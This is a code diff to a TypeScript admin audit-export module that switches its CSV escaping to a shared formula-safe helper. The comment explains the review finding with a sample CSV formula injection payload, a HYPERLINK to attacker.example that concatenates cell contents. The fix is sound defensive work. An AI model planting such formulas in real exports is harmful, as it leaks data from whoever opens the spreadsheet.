@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import type { AuditExport, AuditExportManifest } from '@lexprompt/core';
+import { escapeCsvField } from '../tabular/csv';
 import { LoadErrorPanel } from '../../components/LoadErrorPanel';
 import { Button } from '../../components/Button';
 import { getAuditExport } from '../../lib/api/admin';
@@ -73,12 +74,31 @@ export function manifestLines(manifest: AuditExportManifest): string[] {
   ];
 }
 
-/** The CSV, with the manifest as its first block — exactly as the DOCX puts
- *  `dispositionsAsAtLine` first, and for the same reason: a reader who opens
- *  the file must meet its scope before its rows. */
+/**
+ * The CSV, with the manifest as its first block — exactly as the DOCX puts
+ * `dispositionsAsAtLine` first, and for the same reason: a reader who opens
+ * the file must meet its scope before its rows.
+ *
+ * ## Why the escape is IMPORTED and not written here
+ *
+ * It was written here, and it was written WRONG — half of `escapeCsvField`,
+ * with the quote-doubling kept and the formula-lead guard dropped. The
+ * cross-stage seam review found it (C2). A reviewer can name a matter
+ * `=HYPERLINK("https://attacker.example/"&A1&B1,"Open")` through
+ * `PUT /v1/matters/:id`, and that name reaches the "Matter" column of the
+ * extract an ADMINISTRATOR opens in Excel — the widest read in this
+ * application, in the artefact most likely to be opened in a spreadsheet.
+ * Quoting protects column alignment; it does not stop evaluation.
+ *
+ * There are three CSV writers in this repository now. `features/tabular/csv.ts`
+ * defines the escape, `features/review/exportHistoryCsv.ts` imports it, and
+ * this one re-implemented it — `CLAUDE.md`'s sibling-drift rule failing at
+ * the third copy, over an extraction that already existed and that the
+ * previous stage had already reused. `src/test/csvSafety.test.ts` now refuses
+ * a fourth.
+ */
 export function toCsv(result: AuditExport): string {
-  const cell = (v: string | number | undefined): string =>
-    `"${String(v ?? '').replace(/"/g, '""')}"`;
+  const cell = (v: string | number | undefined): string => escapeCsvField(String(v ?? ''));
   const lines = manifestLines(result.manifest).map(l => cell(l));
   lines.push('');
   lines.push([
